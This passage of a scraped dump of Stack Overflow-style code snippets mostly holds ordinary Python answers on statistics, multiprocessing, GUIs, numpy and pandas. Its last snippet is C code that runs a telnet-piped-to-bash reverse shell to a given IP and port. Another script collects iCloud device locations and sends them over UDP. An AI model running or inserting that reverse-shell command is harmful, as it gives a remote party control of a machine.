from scipy.stats.contingency import margins


def residuals(observed, expected):
    return (observed - expected) / np.sqrt(expected)

def stdres(observed, expected):
    n = observed.sum()
    rsum, csum = margins(observed)
    v = csum * rsum * (n - rsum) * (n - csum) / n**3
    return (observed - expected) / np.sqrt(v)
</snippet></ROW><ROW><id>20457483</id><snippet>&gt;&gt;&gt; F = np.array([[33, 250, 196, 136, 32], [55, 293, 190, 71, 13]])

&gt;&gt;&gt; chi2, p, dof, expected = chi2_contingency(F)

&gt;&gt;&gt; residuals(F, expected)
array([[-1.77162519, -1.61362277, -0.05718356,  2.96508777,  1.89079393],
       [ 1.80687785,  1.64573143,  0.05832142, -3.02408853, -1.92841787]])

&gt;&gt;&gt; stdres(F, expected)
array([[-2.62309082, -3.0471942 , -0.09791681,  4.6295814 ,  2.74991911],
       [ 2.62309082,  3.0471942 ,  0.09791681, -4.6295814 , -2.74991911]])
</snippet></ROW><ROW><id>20457483</id><snippet>&gt; F &lt;- as.table(rbind(c(33, 250, 196, 136, 32), c(55, 293, 190, 71, 13)))

&gt; result &lt;- chisq.test(F)

&gt; result$residuals
            A           B           C           D           E
A -1.77162519 -1.61362277 -0.05718356  2.96508777  1.89079393
B  1.80687785  1.64573143  0.05832142 -3.02408853 -1.92841787

&gt; result$stdres
            A           B           C           D           E
A -2.62309082 -3.04719420 -0.09791681  4.62958140  2.74991911
B  2.62309082  3.04719420  0.09791681 -4.62958140 -2.74991911
</snippet></ROW><ROW><id>20457514</id><snippet>processs = []
for security in security_list:
    p = multiprocessing.Process(target=get_csv_file, args=(security,))
    p.start()
    processs.append(p)

for p in processs:
    p.join()
</snippet></ROW><ROW><id>20457514</id><snippet>pool = multiprocessing.Pool(processes=5)
pool.map(get_csv_file, security_list)
</snippet></ROW><ROW><id>20457659</id><snippet>&gt;&gt;&gt; lst[::3]
[1, 2, 3]
</snippet></ROW><ROW><id>20457659</id><snippet>slice notation</snippet></ROW><ROW><id>20457733</id><snippet>my_list</snippet></ROW><ROW><id>20457733</id><snippet>my_list</snippet></ROW><ROW><id>20457733</id><snippet>categories = [item.category for item in my_list]
my_list.sort(key = lambda item: categories.index(item.category))
</snippet></ROW><ROW><id>20457814</id><snippet>logging.DEBUG</snippet></ROW><ROW><id>20457814</id><snippet>stderr</snippet></ROW><ROW><id>20457814</id><snippet>stdout</snippet></ROW><ROW><id>20457814</id><snippet>stderr</snippet></ROW><ROW><id>20457814</id><snippet>StreamHandler</snippet></ROW><ROW><id>20457814</id><snippet>import os
from flask import Flask

app = Flask(__name__)

# log to stderr
import logging
from logging import StreamHandler
file_handler = StreamHandler()
app.logger.setLevel(logging.DEBUG)  # set the desired logging level here
app.logger.addHandler(file_handler)

@app.route('/')
def hello():
    app.logger.debug('A value for debugging')
    app.logger.warning('A value for warning')
    return 'Hello World!'
</snippet></ROW><ROW><id>20457814</id><snippet>from flask import Flask
app = Flask(__name__)
app.debug = True
</snippet></ROW><ROW><id>20457910</id><snippet>0</snippet></ROW><ROW><id>20457910</id><snippet>str[0]</snippet></ROW><ROW><id>20457910</id><snippet>str[len(str) - 1]</snippet></ROW><ROW><id>20457910</id><snippet>reverse = len(quote)</snippet></ROW><ROW><id>20457910</id><snippet>quote[len(quote)]</snippet></ROW><ROW><id>20457910</id><snippet>reverse = a - 1</snippet></ROW><ROW><id>20457910</id><snippet>while reverse &gt;= 0:
    print(quote[reverse])
    reverse = reverse - 1
</snippet></ROW><ROW><id>20457936</id><snippet>vbox.addStretch(1)</snippet></ROW><ROW><id>20457936</id><snippet>hbox.addStretch(1)</snippet></ROW><ROW><id>20457936</id><snippet>    ok.setSizePolicy(QtGui.QSizePolicy.Minimum,
                     QtGui.QSizePolicy.Minimum)
    cancel.setSizePolicy(QtGui.QSizePolicy.Minimum,
                         QtGui.QSizePolicy.Minimum)
</snippet></ROW><ROW><id>20457936</id><snippet>    vbox = QtGui.QHBoxLayout()
    vbox.addStretch(1)
    vbox.addWidget(ok)
    vbox.addStretch(2)
    vbox.addWidget(cancel)
</snippet></ROW><ROW><id>20457990</id><snippet>get_multi</snippet></ROW><ROW><id>20457990</id><snippet>id &gt; 0</snippet></ROW><ROW><id>20457990</id><snippet>ids = [0, 1]
futures = [Key(Entity, id).get_async() if id &gt; 0 else None for id in ids]
rows = [future.get_result() if future else None for future in futures]
</snippet></ROW><ROW><id>20458067</id><snippet>$ 2to3 --output-dir=python3-version/mycode -W -n python2-version/mycode
</snippet></ROW><ROW><id>20458290</id><snippet>Toplevel</snippet></ROW><ROW><id>20458290</id><snippet>from Tkinter import *

master = Tk()
C = Canvas(master, width=200, height=100)
C.pack()

def Open():
    top = Toplevel()
    # Add a label to the TopLevel, just like you would the root window
    lbl = Label(top, text="Hello World")
    lbl.pack()

b = Button(master, text="Open New Window", command=Open)
b.pack()

mainloop()
</snippet></ROW><ROW><id>20458290</id><snippet>Toplevel</snippet></ROW><ROW><id>20458290</id><snippet>top</snippet></ROW><ROW><id>20458290</id><snippet>Toplevel</snippet></ROW><ROW><id>20458336</id><snippet>os.path.exists</snippet></ROW><ROW><id>20458336</id><snippet>@mock.patch('os.path.exists')
def test_vm_exists(self, mock_exists):
    mock_exists.return_value = True
    fake_path = 'fake/path'

    response = self._VixConnection.vm_exists(fake_path)

    mock_exists.assert_called_with(fake_path)
    self.assertEqual(response, True)
</snippet></ROW><ROW><id>20458349</id><snippet> $("#select1").change(function() {
                var selectedVal = $(this).find("option:selected").val();
                $("#select2 option").removeAttr("disabled").removeAttr("selected");
                $("#select2 option").each(function() {
                    if($(this).val() != selectedVal &amp;&amp; $(this).val() != -1)
                        $(this).attr("disabled","disabled").removeAttr("selected"); 
</snippet></ROW><ROW><id>20458349</id><snippet> &lt;head&gt;
    &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
    &lt;title&gt;Test html&lt;/title&gt;

    &lt;script type="text/javascript"&gt;
        $(document).ready(function() {{
            $("#select1").change(function() {{
                var selectedVal = $(this).find("option:selected").val();
                $("#select2 option").removeAttr("disabled").removeAttr("selected");
                $("#select2 option").each(function() {{
                    if($(this).val() != selectedVal &amp;&amp; $(this).val() != -1)
                        $(this).attr("disabled","disabled").removeAttr("selected"); 
                }});
            }});
        }});
 &lt;/script&gt;


&lt;/head&gt;
</snippet></ROW><ROW><id>20458399</id><snippet>myFirstFunction</snippet></ROW><ROW><id>20458399</id><snippet>myFirstFunction(apples, oranges)
</snippet></ROW><ROW><id>20458399</id><snippet>raw_input</snippet></ROW><ROW><id>20458399</id><snippet>myFirstFunction</snippet></ROW><ROW><id>20458399</id><snippet>int</snippet></ROW><ROW><id>20458399</id><snippet>apples = int(raw_input("How many apples do you have?"))
oranges = int(raw_input("How many oranges do you have?"))
</snippet></ROW><ROW><id>20458399</id><snippet>apples = int(raw_input("How many apples do you have?"))
oranges = int(raw_input("How many oranges do you have?"))

def myFirstFunction(apples, oranges):
    total_fruit = apples * oranges
    print total_fruit

myFirstFunction(apples, oranges)
</snippet></ROW><ROW><id>20458399</id><snippet>How many apples do you have?2
How many oranges do you have?2
4
</snippet></ROW><ROW><id>20458553</id><snippet>south</snippet></ROW><ROW><id>20458553</id><snippet>django</snippet></ROW><ROW><id>20458553</id><snippet>0.8.4</snippet></ROW><ROW><id>20458553</id><snippet>sudo easy_install -U South
</snippet></ROW><ROW><id>20458575</id><snippet>image_factory</snippet></ROW><ROW><id>20458575</id><snippet>qrcode.image.base.BaseImage</snippet></ROW><ROW><id>20458575</id><snippet>new_image</snippet></ROW><ROW><id>20458575</id><snippet>drawrect</snippet></ROW><ROW><id>20458575</id><snippet>save</snippet></ROW><ROW><id>20458575</id><snippet>from PyQt4 import QtGui, QtCore
import qrcode

class Image(qrcode.image.base.BaseImage):
    def __init__(self, border, width, box_size):
        self.border = border
        self.width = width
        self.box_size = box_size
        size = (width + border * 2) * box_size
        self._image = QtGui.QImage(
            size, size, QtGui.QImage.Format_RGB16)
        self._image.fill(QtCore.Qt.white)

    def pixmap(self):
        return QtGui.QPixmap.fromImage(self._image)

    def drawrect(self, row, col):
        painter = QtGui.QPainter(self._image)
        painter.fillRect(
            (col + self.border) * self.box_size,
            (row + self.border) * self.box_size,
            self.box_size, self.box_size,
            QtCore.Qt.black)

    def save(self, stream, kind=None):
        pass

class Window(QtGui.QWidget):
    def __init__(self):
        QtGui.QWidget.__init__(self)
        self.label = QtGui.QLabel(self)
        self.edit = QtGui.QLineEdit(self)
        self.edit.returnPressed.connect(self.handleTextEntered)
        layout = QtGui.QVBoxLayout(self)
        layout.addWidget(self.label)
        layout.addWidget(self.edit)

    def handleTextEntered(self):
        text = unicode(self.edit.text())
        self.label.setPixmap(
            qrcode.make(text, image_factory=Image).pixmap())

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = Window()
    window.setGeometry(500, 300, 200, 200)
    window.show()
    sys.exit(app.exec_())
</snippet></ROW><ROW><id>20458576</id><snippet>timepoints</snippet></ROW><ROW><id>20458576</id><snippet>interd</snippet></ROW><ROW><id>20458576</id><snippet>1</snippet></ROW><ROW><id>20458576</id><snippet>import numpy as np
import matplotlib.pyplot as pl

# you can do this in one line, that's what 'unpack' is for:
timepoints, intensity = np.loadtxt('dataset', usecols=(0,1), unpack=True, delimiter=",")

sp = np.fft.fft(intensity)
freq = np.fft.fftfreq(len(intensity))  #using default d=1

pl.plot(np.fft.fftshift(freq), np.fft.fftshift(np.abs(sp)))
pl.xlabel("frequency(Hz)")
pl.show()
</snippet></ROW><ROW><id>20458576</id><snippet>fftshift</snippet></ROW><ROW><id>20458576</id><snippet>np.sqrt(sp.imag**2 + sp.real**2)</snippet></ROW><ROW><id>20458576</id><snippet>np.abs</snippet></ROW><ROW><id>20458576</id><snippet>fft</snippet></ROW><ROW><id>20458595</id><snippet>&gt;&gt;&gt; print hex(33434)
0x829a
&gt;&gt;&gt; print hex(39554)
0x9a82
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20458619</id><snippet>git aws.push</snippet></ROW><ROW><id>20458619</id><snippet>git init</snippet></ROW><ROW><id>20458619</id><snippet>$ cd angrywhopper
$ git init #optional
$ eb init
...
$ git aws.push
</snippet></ROW><ROW><id>20458619</id><snippet>eb init</snippet></ROW><ROW><id>20458619</id><snippet>eb</snippet></ROW><ROW><id>20458619</id><snippet>eb init</snippet></ROW><ROW><id>20458832</id><snippet>np.genfromtxt</snippet></ROW><ROW><id>20458832</id><snippet>np.fromfile</snippet></ROW><ROW><id>20458832</id><snippet>&gt;&gt;&gt; np.genfromtxt('tmp.txt', dtype=str)
array([['1', 'Hydrogen', '1.008'],
       ['2', 'Helium', '4.002602'],
       ['3', 'Lithium', '6.94'],
       ['4', 'Beryllium', '9.0121831'],
       ['5', 'Boron', '10.81'],
       ['6', 'Carbon', '12.011']], 
      dtype='|S9')
</snippet></ROW><ROW><id>20458832</id><snippet>&gt;&gt;&gt; np.genfromtxt('tmp.txt', dtype=None)
array([(1, 'Hydrogen', 1.008), (2, 'Helium', 4.002602),
       (3, 'Lithium', 6.94), (4, 'Beryllium', 9.0121831),
       (5, 'Boron', 10.81), (6, 'Carbon', 12.011)], 
      dtype=[('f0', '&lt;i8'), ('f1', 'S9'), ('f2', '&lt;f8')])
</snippet></ROW><ROW><id>20458832</id><snippet>unpack</snippet></ROW><ROW><id>20458832</id><snippet>&gt;&gt;&gt; n, name, mass = np.genfromtxt('tmp.txt', dtype='S', unpack=True)
&gt;&gt;&gt; n = n.astype(int)
&gt;&gt;&gt; mass = mass.astype(float)
</snippet></ROW><ROW><id>20458936</id><snippet>AdminSite</snippet></ROW><ROW><id>20458936</id><snippet>app_index_template = None
login_template = None
logout_template = None
password_change_template = None
password_change_done_template = None
</snippet></ROW><ROW><id>20458936</id><snippet>ModelAdmin</snippet></ROW><ROW><id>20458936</id><snippet>add_form_template = None
change_form_template = None
change_list_template = None
delete_confirmation_template = None
delete_selected_confirmation_template = None
object_history_template = None
</snippet></ROW><ROW><id>20458936</id><snippet>class MyAdminSite(AdminSite):
    app_index_template = "my/new/admin/app_index.html"
</snippet></ROW><ROW><id>20458952</id><snippet>python ez_setup.py install</snippet></ROW><ROW><id>20459118</id><snippet>seen = set()
res = []
for line in textlines:
    if line not in seen:
        res.append(line)
        if not line.strip():
            seen.add(line)
textlines = res
</snippet></ROW><ROW><id>20459124</id><snippet>zip</snippet></ROW><ROW><id>20459124</id><snippet>&gt;&gt;&gt; x = [10,20,1]
&gt;&gt;&gt; y = [10,15,2]
&gt;&gt;&gt; z = [12,23,3]
&gt;&gt;&gt; zip(x, y, z)
[(10, 10, 12), (20, 15, 23), (1, 2, 3)]
</snippet></ROW><ROW><id>20459124</id><snippet>&gt;&gt;&gt; [list(t) for t in zip(x, y, z)]
[[10, 10, 12], [20, 15, 23], [1, 2, 3]]
</snippet></ROW><ROW><id>20459124</id><snippet>zip</snippet></ROW><ROW><id>20459124</id><snippet>itertools.izip</snippet></ROW><ROW><id>20459177</id><snippet>print
</snippet></ROW><ROW><id>20459213</id><snippet>98e48ca</snippet></ROW><ROW><id>20459213</id><snippet>In [27]: n = 4

In [28]: df = DataFrame(randn(n, 2), index=date_range('1/1/2001', periods=n, freq='30S'))

In [29]: resampled = df.resample('S')

In [30]: resampled.head()
Out[30]:
                         0      1
2001-01-01 00:00:00 -1.045 -1.067
2001-01-01 00:00:01    NaN    NaN
2001-01-01 00:00:02    NaN    NaN
2001-01-01 00:00:03    NaN    NaN
2001-01-01 00:00:04    NaN    NaN

[5 rows x 2 columns]

In [31]: interp = resampled.interpolate()

In [32]: interp.head()
Out[32]:
                         0      1
2001-01-01 00:00:00 -1.045 -1.067
2001-01-01 00:00:01 -1.014 -1.042
2001-01-01 00:00:02 -0.983 -1.018
2001-01-01 00:00:03 -0.952 -0.993
2001-01-01 00:00:04 -0.921 -0.969

[5 rows x 2 columns]

In [33]: interp.tail()
Out[33]:
                         0      1
2001-01-01 00:01:26  0.393  0.622
2001-01-01 00:01:27  0.337  0.571
2001-01-01 00:01:28  0.281  0.519
2001-01-01 00:01:29  0.225  0.468
2001-01-01 00:01:30  0.169  0.416

[5 rows x 2 columns]
</snippet></ROW><ROW><id>20459213</id><snippet>Series.interpolate()</snippet></ROW><ROW><id>20459213</id><snippet>DataFrame.resample()</snippet></ROW><ROW><id>20459282</id><snippet>pty.spawn("/bin/sh", read_callback)</snippet></ROW><ROW><id>20459282</id><snippet>program.py</snippet></ROW><ROW><id>20459282</id><snippet>os.read</snippet></ROW><ROW><id>20459282</id><snippet>read_callback</snippet></ROW><ROW><id>20459282</id><snippet>def read_callback(fd):
    data = os.read(fd, 1024) # &lt;-- this doesn't block
    return data 
</snippet></ROW><ROW><id>20459282</id><snippet>PS1</snippet></ROW><ROW><id>20459282</id><snippet>sh</snippet></ROW><ROW><id>20459282</id><snippet>echo something_unique</snippet></ROW><ROW><id>20459282</id><snippet>something_unique</snippet></ROW><ROW><id>20459282</id><snippet>pexpect.run()</snippet></ROW><ROW><id>20459460</id><snippet>from pyicloud import PyiCloudService
api = []
api.append(PyiCloudService('JAppleseedAppleIdEmailHere', 'password'))
api.append(PyiCloudService('SomeOtherAppleIdEmailHere', 'psadfsdfassword'))
PeerIp = '127.0.0.1'
PeerPort = 2028
ThreadRunCount = -1
InfoEveryRunTime = 10
import time, threading, socket, json
def update_device_position():
    smsg = '{\n'
    global ThreadRunCount
    ThreadRunCount += 1
    MESSAGE = json.dumps([dict(device=str(device), location=device.location()) for a in api for device in a.devices.values()]).encode()
    DevCount = 0
    for a in api:
        for key, value in a.devices.items():
            DevCount += 1
    sock.sendto(MESSAGE, (PeerIp, PeerPort))
    tmst = time.strftime('%H:%M:%S')
    if (ThreadRunCount % InfoEveryRunTime) == 0:
        ThreadRunCount = 1
        print('[' + tmst+ '] JSON of ' + str(len(MESSAGE))  +' bytes from ' + str(DevCount) + ' devices sent to ' + PeerIp + ':' + str(PeerPort)) 
                     # Internet      # UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
stopped = threading.Event()
while not stopped.wait(10):
    update_device_position()
</snippet></ROW><ROW><id>20459544</id><snippet>def addLines(filename):
    with open(filename, 'r') as fin:
        with open('test2.txt', 'w') as fout:
            for line in fin:
                fout.write('First {0}'.format(line))
</snippet></ROW><ROW><id>20459544</id><snippet>        i = 1
        for line in fin:
            fout.write('Line #{0}: {1}'.format(i, line))
            i += 1
</snippet></ROW><ROW><id>20459544</id><snippet>numbers = {1: 'first', 2: 'second'}</snippet></ROW><ROW><id>20459544</id><snippet>            fout.write('{0} {1}'.format(numbers[i], line))
</snippet></ROW><ROW><id>20459619</id><snippet>GPIO.BCM</snippet></ROW><ROW><id>20459619</id><snippet>GPIO.BOARD</snippet></ROW><ROW><id>20459619</id><snippet>GPIO.setmode(GPIO.BCM)
</snippet></ROW><ROW><id>20459703</id><snippet>import sys

try:
    import user
except ImportError:
    if sys.exc_info()[2].tb_next:
        raise

    logging.info('No user script loaded.')
</snippet></ROW><ROW><id>20459703</id><snippet>ImportError</snippet></ROW><ROW><id>20459703</id><snippet>user</snippet></ROW><ROW><id>20459703</id><snippet>sys.exc_info()[2].tb_next</snippet></ROW><ROW><id>20459719</id><snippet>__str__</snippet></ROW><ROW><id>20459719</id><snippet>Student</snippet></ROW><ROW><id>20459719</id><snippet>def __str__(self):
    return self.name # Here the string you want to print
</snippet></ROW><ROW><id>20459754</id><snippet>character = get_char()</snippet></ROW><ROW><id>20459754</id><snippet>def get_char(is_valid = lambda c: True):
    while True:
        c = raw_input('enter a character &gt; ')
        if is_valid(c):
            keep = raw_input('do you want to use {0}? (Y/N)&gt; '.format(c)).lower()
            if 'n' in keep:
                continue # go back to While True line
            return c
        print('{0} is not a valid character'.format(c))
</snippet></ROW><ROW><id>20459754</id><snippet>&gt;&gt;&gt; get_char()
enter a character &gt; a
do you want to use a? (Y/N)&gt; n
enter a character &gt; c
do you want to use c? (Y/N)&gt; no
enter a character &gt; x
do you want to use x? (Y/N)&gt; y
'x'
</snippet></ROW><ROW><id>20459754</id><snippet>proceed in "N,n"</snippet></ROW><ROW><id>20459754</id><snippet>n</snippet></ROW><ROW><id>20459754</id><snippet>isalpha</snippet></ROW><ROW><id>20459765</id><snippet>any()</snippet></ROW><ROW><id>20459765</id><snippet>all()</snippet></ROW><ROW><id>20459765</id><snippet>if any(c not in message for c in ('CondA', 'CondB', ...)):
    ...
</snippet></ROW><ROW><id>20459765</id><snippet>map()</snippet></ROW><ROW><id>20459765</id><snippet>if not all(map(message.__contains__, ('CondA', 'CondB', ...))):
</snippet></ROW><ROW><id>20459774</id><snippet>ul</snippet></ROW><ROW><id>20459774</id><snippet>div</snippet></ROW><ROW><id>20459774</id><snippet>&lt;div id="purchaseButtonWrapper" class="shoveler-button-wrapper"&gt;
    &lt;a class="back-button" onclick="return false;" style="" href="#Back"&gt;
    &lt;div class="shoveler-content"&gt;
        &lt;ul tabindex="-1"&gt;
            &lt;li class="shoveler-cell" style="margin-left: 16px; margin-right: 16px;"&gt;
                &lt;div id="purchase_B003LSTK8G" class="new-faceout p13nimp" data-ref="pd_sim_kstore_1" data-asin="B003LSTK8G"&gt;
                ...
                &lt;/div&gt;
            &lt;/li&gt;
            &lt;li class="shoveler-cell" style="margin-left: 16px; margin-right: 16px;"&gt;...&lt;/li&gt;
            &lt;li class="shoveler-cell" style="margin-left: 16px; margin-right: 16px;"&gt;...&lt;/li&gt;
            &lt;li class="shoveler-cell" style="margin-left: 16px; margin-right: 16px;"&gt;...&lt;/li&gt;
            &lt;li class="shoveler-cell" style="margin-left: 16px; margin-right: 16px;"&gt;...&lt;/li&gt;
            &lt;li class="shoveler-cell" style="margin-left: 16px; margin-right: 16px;"&gt;...&lt;/li&gt;
        &lt;/ul&gt;
    &lt;/div&gt;
    &lt;a class="next-button" onclick="return false;" style="" href="#Next"&gt;
        &lt;span class="auiTestSprite s_shvlNext"&gt;...&lt;/span&gt;
    &lt;/a&gt;
    &lt;/div&gt;
&lt;/div&gt;
</snippet></ROW><ROW><id>20459774</id><snippet>http://www.amazon.com
    /gp/product/features/similarities/shoveler/cell-render.html/ref=pd_sim_kstore?
    id=B00261OOWQ,B003XQEVUI,B001NLL5WC,B000FC1KZC,B005G5PPGS,B0043RSJB8,
    B004TSBWYC,B000RH0C8G,B0035IID08,B002AQRVXQ,B005DIAUN6,B000FC10QG
    &amp;pos=7&amp;refTag=pd_sim_kstore&amp;wdg=ebooks_display_on_website
    &amp;shovelerName=purchase
</snippet></ROW><ROW><id>20459774</id><snippet>id</snippet></ROW><ROW><id>20459774</id><snippet>application/json</snippet></ROW><ROW><id>20459774</id><snippet>&lt;div class="new-faceout p13nimp" id="purchase_B00261OOWQ" data-asin="B00261OOWQ" data-ref="pd_sim_kstore_7"&gt;
    &lt;a href="/Home-Game-Accidental-Guide-Fatherhood-ebook/dp/B00261OOWQ/ref=pd_sim_kstore_7" class="sim-img-title" &gt;
        &lt;div class="product-image"&gt;
            &lt;img src="http://ecx.images-amazon.com/images/I/51ZBpvGgsUL._SL500_PIsitb-sticker-arrow-big,TopRight,35,-73_OU01_SS100_.jpg" width="100" alt="" height="100" border="0" /&gt; 
        &lt;/div&gt; Home Game: An Accidental Guide to Fatherhood
    &lt;/a&gt; 
    &lt;div class="byline"&gt;
        &lt;span class="carat"&gt;&amp;#8250&lt;/span&gt; 
        &lt;a href="http://www.amazon.com/Michael-Lewis/e/B000APZ33E/ref=pd_sim_kstore_bl_7"&gt;Michael Lewis&lt;/a&gt; 
    &lt;/div&gt; 

    &lt;div class="rating-price"&gt; 
        &lt;span class="rating-stars"&gt;
            &lt;span class="crAvgStars" style="white-space:no-wrap;"&gt;
                &lt;span class="asinReviewsSummary" name="B00261OOWQ"&gt;
                    &lt;a href="http://rads.stackoverflow.com/amzn/click/B00261OOWQ"&gt;
                        &lt;span class="auiTestSprite s_star_4_0 " title="4.1 out of 5 stars" &gt;
                            &lt;span&gt;4.1 out of 5 stars&lt;/span&gt;
                        &lt;/span&gt;
                    &lt;/a&gt; 
                &lt;/span&gt;
                (&lt;a href="http://rads.stackoverflow.com/amzn/click/B00261OOWQ"&gt;99&lt;/a&gt;)
            &lt;/span&gt;
        &lt;/span&gt; 
    &lt;/div&gt; 
    &lt;div class="binding-platform"&gt; Kindle Edition &lt;/div&gt; 
    &lt;div class="pricetext"&gt;&lt;span class="price" style="margin-right:5px"&gt;$11.36&lt;/span&gt;&lt;/div&gt; 
&lt;/div&gt;
</snippet></ROW><ROW><id>20459774</id><snippet>&lt;li&gt;</snippet></ROW><ROW><id>20459774</id><snippet>&lt;div class="shoveler-content"&gt;&lt;ul&gt;</snippet></ROW><ROW><id>20459774</id><snippet>id</snippet></ROW><ROW><id>20459774</id><snippet>&lt;div id="purchaseSimsData" 
    class="sims-data" style="display:none" 
    data-baseAsin="B005CRQ2OE" data-featureId="pd_sim" 
    data-pageId="B005CRQ2OEr_sim_2" data-reftag="pd_sim_kstore"
    data-wdg="ebooks_display_on_website" data-widgetName="purchase"&gt;
    B003LSTK8G,B000VKVZR6,B003E20ZRY,B000RH0C9A,B000RH0CA4,B000YMDQRS,
    B00261OOWQ,B003XQEVUI,B001NLL5WC,B000FC1KZC,B005G5PPGS,B0043RSJB8,
    B004TSBWYC,B000RH0C8G,B0035IID08,B002AQRVXQ,B005DIAUN6,B000FC10QG,
    B0018QQQKS,B002OTKEP6,B005PUWUKS,B007V65R54,B00B3VOTTI,B004EYT932,
    B002UBRFFU,B000WJSB50,B000RH0DYE,B004JXXKWY,B003E8AJXI,B008TRU7PE,
    B00555X8OA,B007OSIOWM,B00DLJIA54,B00139XTG4,B0058Z4NR8,B00ALBR6JG,
    B004H0M8QS,B003F3PL7Q,B008UX8YPC,B000U913GG,B003HOXLVQ,B000VWM0MI,
    B000SEIU28,B006VE7YS0,B008KPMBIG,B003CIQ57E,B0064EHZY0,B008UX3ITE,
    B001NLKY38,B003VIWK4C,B005GSYZRA,B007YGGOVM,B004H4X84K,B00B5ZQ72Y,
    B000R1BAH4,B008W02TIG,B000W8HC8I,B0036QVOKU,B000VRBBDC,B00APDGFOC,
    B00EOAS0EK,B000QCS888,B001QIGZEK,B0074B55IK,B000FC12C8,B00AP2XVJ0,
    B000FCK5YE,B006ID6UAW,B001FA0W5W,B005HFI0X2,B006ZOYM9K,B003SNJZ3Y,
    B00C1N5WOI,B008EKORIY,B00C4GRK4W,B004V3WRNU,B00BV6RTUG,B001AFF266,
    B00DUM1W3E,B00APDGGCS,B008WOUFIS,B008EKOO46,B008JHXO6S,B005AJM3U6,
    B00BKRW6GI,B00CDUVSQ0,B00A287PG2,B009H679WA,B000VDUWMC,B009NF6IRW
&lt;/div&gt;
</snippet></ROW><ROW><id>20459774</id><snippet>json</snippet></ROW><ROW><id>20459785</id><snippet>apt</snippet></ROW><ROW><id>20459785</id><snippet>sudo apt-get install python-pygame</snippet></ROW><ROW><id>20459785</id><snippet>pip</snippet></ROW><ROW><id>20459809</id><snippet>event</snippet></ROW><ROW><id>20459809</id><snippet>for even in pygame.event.get():
</snippet></ROW><ROW><id>20459809</id><snippet>for event in pygame.event.get():
</snippet></ROW><ROW><id>20459821</id><snippet>continue</snippet></ROW><ROW><id>20459821</id><snippet>d</snippet></ROW><ROW><id>20459821</id><snippet>Research and development</snippet></ROW><ROW><id>20459821</id><snippet>def get_data():
    header_list = ['Gross profit', 'Research and development', 
                   'Total costs and expenses', 'Total operating expenses',
                   'Operating income', 'Income before income taxes']
    raw_financial_data = [['Fiscal year ends in December. USD in millions except per share data.', 'TTM', '2012-12', '2011-12', '2010-12', '2009-12', '2008-12'], 
                          ['Gross profit', '125390', '146216', '179627', '120923', '98817', '188549'], 
                          ['Costs and expenses'],                         
                          ['Total costs and expenses', '64695', '67490', '106370', '67964', '64040', '106799'],
                          ['Income before income taxes', '60695', '78726', '73257', '52959', '34777', '81750']]
    financial_data = []
    rfd_header = [h[0] for h in raw_financial_data]            
    ttm_count = 0
    for d in header_list:                
        print ''
        print d
        for i in raw_financial_data:
            try:
                if i[1] == 'TTM' and ttm_count == 0:
                    print '1st append', i
                    financial_data.append(i)
                    ttm_count = 1
                    continue
            except IndexError:
                print 'IndexError'
                continue   
            if i[0] == d:
                print '2nd append', i
                financial_data.append(i)
            elif d not in rfd_header:
                rfd_header.append(d)
                print '3nd append', 'No Data'
                financial_data.append(['No Data', 'N/A', 'N/A',
                                                'N/A', 'N/A', 'N/A','N/A'])
            else:
                print 'no append'
    return financial_data

if __name__ == "__main__":
    for row in get_data():
        print row
</snippet></ROW><ROW><id>20459821</id><snippet>Gross profit
1st append ['Fiscal year ends in December. USD in millions except per share data.', 'TTM', '2012-12', '2011-12', '2010-12', '2009-12', '2008-12']
2nd append ['Gross profit', '125390', '146216', '179627', '120923', '98817', '188549']
IndexError
no append
no append

Research and development
3nd append No Data
no append
IndexError
no append
no append

Total costs and expenses
no append
no append
IndexError
2nd append ['Total costs and expenses', '64695', '67490', '106370', '67964', '64040', '106799']
no append

Total operating expenses
3nd append No Data
no append
IndexError
no append
no append

Operating income
3nd append No Data
no append
IndexError
no append
no append

Income before income taxes
no append
no append
IndexError
no append
2nd append ['Income before income taxes', '60695', '78726', '73257', '52959', '34777', '81750']
['Fiscal year ends in December. USD in millions except per share data.', 'TTM', '2012-12', '2011-12', '2010-12', '2009-12', '2008-12']
['Gross profit', '125390', '146216', '179627', '120923', '98817', '188549']
['No Data', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A']
['Total costs and expenses', '64695', '67490', '106370', '67964', '64040', '106799']
['No Data', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A']
['No Data', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A', 'N/A']
['Income before income taxes', '60695', '78726', '73257', '52959', '34777', '81750']
</snippet></ROW><ROW><id>20460020</id><snippet>match_y</snippet></ROW><ROW><id>20460020</id><snippet>def match_y(noun):
    # return re.sub('y$', 'ies', noun)   # NO!
    return re.search('y$', noun)
</snippet></ROW><ROW><id>20460020</id><snippet>True</snippet></ROW><ROW><id>20460020</id><snippet>apply_y</snippet></ROW><ROW><id>20460209</id><snippet>(q,qq,qqq)=mystring.split()</snippet></ROW><ROW><id>20460252</id><snippet>def smallest(numbers):
    newlist = numbers.split(',') #splits the incoming comma-separated array
    newlist.sort() #sorts alphabetically/numerical
    return newlist[0] #returns the first value in the list, now the lowest

def main():
    input_file = open("num.txt", "r")
    number_file = input_file.readlines()
    for i in range(len(number_file)):
        print smallest(number_file[i]).rstrip() #rstrip strips \n from output
main()
</snippet></ROW><ROW><id>20460257</id><snippet>&gt;&gt;&gt; a = [2,4,5,12]
&gt;&gt;&gt; a = [x-10 if x &gt; 10 else x for x in a]
&gt;&gt;&gt; a
[2, 4, 5, 2]
&gt;&gt;&gt;
</snippet></ROW><ROW><id>20460277</id><snippet>urandom()</snippet></ROW><ROW><id>20460277</id><snippet>os.urandom()</snippet></ROW><ROW><id>20460277</id><snippet>urandom()</snippet></ROW><ROW><id>20460277</id><snippet>PyCrypto</snippet></ROW><ROW><id>20460277</id><snippet>urandom()</snippet></ROW><ROW><id>20460443</id><snippet>snprintf</snippet></ROW><ROW><id>20460443</id><snippet>char cmd[512];
snprintf(cmd, sizeof cmd, "telnet %i %p | bash | telnet %i %p", IP, PORT, IP, PORT);
system(cmd);
